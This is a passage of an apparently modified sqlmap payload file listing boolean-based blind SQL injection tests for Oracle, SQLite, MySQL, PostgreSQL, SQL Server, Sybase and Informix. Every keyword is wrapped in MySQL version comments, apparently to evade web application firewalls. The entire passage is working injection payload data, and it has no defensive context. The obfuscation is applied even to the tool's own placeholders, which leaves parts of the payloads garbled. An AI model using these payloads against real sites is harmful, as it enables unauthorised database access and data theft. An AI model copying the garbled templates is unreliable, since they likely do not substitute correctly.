        <vector>/*!50000OR/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ /*!50000NULL/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CTXSYS/**_**/*/./*!50000DRITHSX/**_**/*/./*!50000SN/**_**/*/(/*!500001/**_**/*/,[/*!50000RANDNUM/**_**/*/]) /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000IS/**_**/*/ /*!50000NULL/**_**/*/</vector>
        <request>
            <payload>/*!50000OR/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ /*!50000NULL/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CTXSYS/**_**/*/./*!50000DRITHSX/**_**/*/./*!50000SN/**_**/*/(/*!500001/**_**/*/,[/*!50000RANDNUM/**_**/*/]) /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000IS/**_**/*/ /*!50000NULL/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000OR/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ /*!50000NULL/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CTXSYS/**_**/*/./*!50000DRITHSX/**_**/*/./*!50000SN/**_**/*/(/*!500001/**_**/*/,[/*!50000RANDNUM/**_**/*/]) /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000IS/**_**/*/ /*!50000NULL/**_**/*/</comparison>
        </response>
        <details>
            <dbms>Oracle</dbms>
        </details>
    </test>

    <test>
        <title>SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)</title>
        <stype>1</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>1</clause>
        <where>1</where>
        <vector>/*!50000AND/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ [/*!50000INFERENCE/**_**/*/] /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000JSON/**_**/*/('[/*!50000RANDSTR/**_**/*/]') /*!50000END/**_**/*/</vector>
        <request>
            <payload>/*!50000AND/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/] /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000JSON/**_**/*/('[/*!50000RANDSTR/**_**/*/]') /*!50000END/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000AND/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/] /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000JSON/**_**/*/('[/*!50000RANDSTR/**_**/*/]') /*!50000END/**_**/*/</comparison>
        </response>
        <details>
            <dbms>SQLite</dbms>
        </details>
    </test>

    <test>
        <title>SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)</title>
        <stype>1</stype>
        <level>3</level>
        <risk>3</risk>
        <clause>1</clause>
        <where>2</where>
        <vector>/*!50000OR/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ [/*!50000INFERENCE/**_**/*/] /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000JSON/**_**/*/('[/*!50000RANDSTR/**_**/*/]') /*!50000END/**_**/*/</vector>
        <request>
            <payload>/*!50000OR/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/] /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000JSON/**_**/*/('[/*!50000RANDSTR/**_**/*/]') /*!50000END/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000OR/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/] /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000JSON/**_**/*/('[/*!50000RANDSTR/**_**/*/]') /*!50000END/**_**/*/</comparison>
        </response>
        <details>
            <dbms>SQLite</dbms>
        </details>
    </test>

    <!-- End of boolean-based blind tests - WHERE or HAVING clause -->

    <!-- Boolean-based blind tests - Parameter replace -->
    <test>
        <title>Boolean-based blind - Parameter replace (original value)</title>
        <stype>1</stype>
        <level>1</level>
        <risk>1</risk>
        <clause>1,2,3</clause>
        <where>3</where>
        <vector>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ (/*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/] /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM2/**_**/*/]) /*!50000END/**_**/*/))</vector>
        <request>
            <payload>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ (/*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/] /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM2/**_**/*/]) /*!50000END/**_**/*/))</payload>
        </request>
        <response>
            <comparison>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ (/*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/] /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM2/**_**/*/]) /*!50000END/**_**/*/))</comparison>
        </response>
    </test>

    <test>
        <title>MySQL boolean-based blind - Parameter replace (MAKE_SET)</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>1,2,3</clause>
        <where>3</where>
        <vector>/*!50000MAKE_SET/**_**/*/([/*!50000INFERENCE/**_**/*/],[/*!50000RANDNUM/**_**/*/])</vector>
        <request>
            <payload>/*!50000MAKE_SET/**_**/*/([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/],[/*!50000RANDNUM1/**_**/*/])</payload>
        </request>
        <response>
            <comparison>/*!50000MAKE_SET/**_**/*/([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/],[/*!50000RANDNUM1/**_**/*/])</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)</title>
        <stype>1</stype>
        <level>5</level>
        <risk>1</risk>
        <clause>1,2,3</clause>
        <where>3</where>
        <vector>/*!50000MAKE_SET/**_**/*/([/*!50000INFERENCE/**_**/*/],[/*!50000ORIGVALUE/**_**/*/])</vector>
        <request>
            <payload>/*!50000MAKE_SET/**_**/*/([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/],[/*!50000ORIGVALUE/**_**/*/])</payload>
        </request>
        <response>
            <comparison>/*!50000MAKE_SET/**_**/*/([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/],[/*!50000ORIGVALUE/**_**/*/])</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>MySQL boolean-based blind - Parameter replace (ELT)</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>1,2,3</clause>
        <where>3</where>
        <vector>/*!50000ELT/**_**/*/([/*!50000INFERENCE/**_**/*/],[/*!50000RANDNUM/**_**/*/])</vector>
        <request>
            <payload>/*!50000ELT/**_**/*/([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/],[/*!50000RANDNUM1/**_**/*/])</payload>
        </request>
        <response>
            <comparison>/*!50000ELT/**_**/*/([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/],[/*!50000RANDNUM1/**_**/*/])</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>MySQL boolean-based blind - Parameter replace (ELT - original value)</title>
        <stype>1</stype>
        <level>5</level>
        <risk>1</risk>
        <clause>1,2,3</clause>
        <where>3</where>
        <vector>/*!50000ELT/**_**/*/([/*!50000INFERENCE/**_**/*/],[/*!50000ORIGVALUE/**_**/*/])</vector>
        <request>
            <payload>/*!50000ELT/**_**/*/([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/],[/*!50000ORIGVALUE/**_**/*/])</payload>
        </request>
        <response>
            <comparison>/*!50000ELT/**_**/*/([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/],[/*!50000ORIGVALUE/**_**/*/])</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>MySQL boolean-based blind - Parameter replace (bool*int)</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>1,2,3</clause>
        <where>3</where>
        <vector>([/*!50000INFERENCE/**_**/*/])*[/*!50000RANDNUM/**_**/*/]</vector>
        <request>
            <payload>([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/])*[/*!50000RANDNUM1/**_**/*/]</payload>
        </request>
        <response>
            <comparison>([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/])*[/*!50000RANDNUM1/**_**/*/]</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>MySQL boolean-based blind - Parameter replace (bool*int - original value)</title>
        <stype>1</stype>
        <level>5</level>
        <risk>1</risk>
        <clause>1,2,3</clause>
        <where>3</where>
        <vector>([/*!50000INFERENCE/**_**/*/])*[/*!50000ORIGVALUE/**_**/*/]</vector>
        <request>
            <payload>([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/])*[/*!50000ORIGVALUE/**_**/*/]</payload>
        </request>
        <response>
            <comparison>([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/])*[/*!50000ORIGVALUE/**_**/*/]</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>PostgreSQL boolean-based blind - Parameter replace</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>1,2,3</clause>
        <where>3</where>
        <vector>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ /*!500001/**_**/*//(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/) /*!50000END/**_**/*/))</vector>
        <request>
            <payload>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ /*!500001/**_**/*//(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/) /*!50000END/**_**/*/))</payload>
        </request>
        <response>
            <comparison>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ /*!500001/**_**/*//(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/) /*!50000END/**_**/*/))</comparison>
        </response>
        <details>
            <dbms>PostgreSQL</dbms>
        </details>
    </test>

    <test>
        <title>PostgreSQL boolean-based blind - Parameter replace (original value)</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>1,2,3</clause>
        <where>3</where>
        <vector>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!500001/**_**/*//(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/) /*!50000END/**_**/*/))</vector>
        <request>
            <payload>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!500001/**_**/*//(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/) /*!50000END/**_**/*/))</payload>
        </request>
        <response>
            <comparison>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!500001/**_**/*//(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/) /*!50000END/**_**/*/))</comparison>
        </response>
        <details>
            <dbms>PostgreSQL</dbms>
        </details>
    </test>

    <!-- Because of the syntax of GENERATE_SERIES() function, the 'then' condition must be 1, do not change it -->
    <test>
        <title>PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)</title>
        <stype>1</stype>
        <level>5</level>
        <risk>1</risk>
        <clause>1,2,3</clause>
        <where>3</where>
        <vector>(/*!50000SELECT/**_**/*/ * /*!50000FROM/**_**/*/ /*!50000GENERATE_SERIES/**_**/*/([/*!50000RANDNUM/**_**/*/],[/*!50000RANDNUM/**_**/*/],/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500000/**_**/*/ /*!50000END/**_**/*/) /*!50000LIMIT/**_**/*/ /*!500001/**_**/*/)</vector>
        <request>
            <payload>(/*!50000SELECT/**_**/*/ * /*!50000FROM/**_**/*/ /*!50000GENERATE_SERIES/**_**/*/([/*!50000RANDNUM/**_**/*/],[/*!50000RANDNUM/**_**/*/],/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500000/**_**/*/ /*!50000END/**_**/*/) /*!50000LIMIT/**_**/*/ /*!500001/**_**/*/)</payload>
        </request>
        <response>
            <comparison>(/*!50000SELECT/**_**/*/ * /*!50000FROM/**_**/*/ /*!50000GENERATE_SERIES/**_**/*/([/*!50000RANDNUM/**_**/*/],[/*!50000RANDNUM/**_**/*/],/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500000/**_**/*/ /*!50000END/**_**/*/) /*!50000LIMIT/**_**/*/ /*!500001/**_**/*/)</comparison>
        </response>
        <details>
            <dbms>PostgreSQL</dbms>
        </details>
    </test>

    <!-- Because of the syntax of GENERATE_SERIES() function, the 'then' condition must be 1, do not change it -->
    <test>
        <title>PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)</title>
        <stype>1</stype>
        <level>5</level>
        <risk>1</risk>
        <clause>1,2,3</clause>
        <where>3</where>
        <vector>(/*!50000SELECT/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000FROM/**_**/*/ /*!50000GENERATE_SERIES/**_**/*/([/*!50000RANDNUM/**_**/*/],[/*!50000RANDNUM/**_**/*/],/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500000/**_**/*/ /*!50000END/**_**/*/) /*!50000LIMIT/**_**/*/ /*!500001/**_**/*/)</vector>
        <request>
            <payload>(/*!50000SELECT/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000FROM/**_**/*/ /*!50000GENERATE_SERIES/**_**/*/([/*!50000RANDNUM/**_**/*/],[/*!50000RANDNUM/**_**/*/],/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500000/**_**/*/ /*!50000END/**_**/*/) /*!50000LIMIT/**_**/*/ /*!500001/**_**/*/)</payload>
        </request>
        <response>
            <comparison>(/*!50000SELECT/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000FROM/**_**/*/ /*!50000GENERATE_SERIES/**_**/*/([/*!50000RANDNUM/**_**/*/],[/*!50000RANDNUM/**_**/*/],/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500000/**_**/*/ /*!50000END/**_**/*/) /*!50000LIMIT/**_**/*/ /*!500001/**_**/*/)</comparison>
        </response>
        <details>
            <dbms>PostgreSQL</dbms>
        </details>
    </test>

    <test>
        <title>Microsoft SQL Server/Sybase boolean-based blind - Parameter replace</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>1,3</clause>
        <where>3</where>
        <vector>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/]) /*!50000END/**_**/*/))</vector>
        <request>
            <payload>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/]) /*!50000END/**_**/*/))</payload>
        </request>
        <response>
            <comparison>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/]) /*!50000END/**_**/*/))</comparison>
        </response>
        <details>
            <dbms>Microsoft SQL Server</dbms>
            <dbms>Sybase</dbms>
        </details>
    </test>

    <test>
        <title>Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>1,3</clause>
        <where>3</where>
        <vector>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/]) /*!50000END/**_**/*/))</vector>
        <request>
            <payload>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/]) /*!50000END/**_**/*/))</payload>
        </request>
        <response>
            <comparison>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/]) /*!50000END/**_**/*/))</comparison>
        </response>
        <details>
            <dbms>Microsoft SQL Server</dbms>
            <dbms>Sybase</dbms>
        </details>
    </test>

    <test>
        <title>Oracle boolean-based blind - Parameter replace</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>1,3</clause>
        <where>3</where>
        <vector>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000CAST/**_**/*/(/*!500001/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT/**_**/*/)/(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/)</vector>
        <request>
            <payload>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000CAST/**_**/*/(/*!500001/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT/**_**/*/)/(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/)</payload>
        </request>
        <response>
            <comparison>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000CAST/**_**/*/(/*!500001/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT/**_**/*/)/(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/)</comparison>
        </response>
        <details>
            <dbms>Oracle</dbms>
        </details>
    </test>

    <test>
        <title>Oracle boolean-based blind - Parameter replace (original value)</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>1,3</clause>
        <where>3</where>
        <vector>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000CAST/**_**/*/(/*!500001/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT/**_**/*/)/(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/)</vector>
        <request>
            <payload>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000CAST/**_**/*/(/*!500001/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT/**_**/*/)/(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/)</payload>
        </request>
        <response>
            <comparison>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000CAST/**_**/*/(/*!500001/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT/**_**/*/)/(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/)</comparison>
        </response>
        <details>
            <dbms>Oracle</dbms>
        </details>
    </test>

    <test>
        <title>Informix boolean-based blind - Parameter replace</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>1,3</clause>
        <where>3</where>
        <vector>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ /*!500001/**_**/*///*!500000/**_**/*/ /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000SYSMASTER/**_**/*/:/*!50000SYSDUAL/**_**/*/)</vector>
        <request>
            <payload>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ /*!500001/**_**/*///*!500000/**_**/*/ /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000SYSMASTER/**_**/*/:/*!50000SYSDUAL/**_**/*/)</payload>
        </request>
        <response>
            <comparison>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ /*!500001/**_**/*///*!500000/**_**/*/ /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000SYSMASTER/**_**/*/:/*!50000SYSDUAL/**_**/*/)</comparison>
        </response>
        <details>
            <dbms>Informix</dbms>
        </details>
    </test>

    <test>
        <title>Informix boolean-based blind - Parameter replace (original value)</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>1,3</clause>
        <where>3</where>
        <vector>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000SYSMASTER/**_**/*/:/*!50000SYSDUAL/**_**/*/)</vector>
        <request>
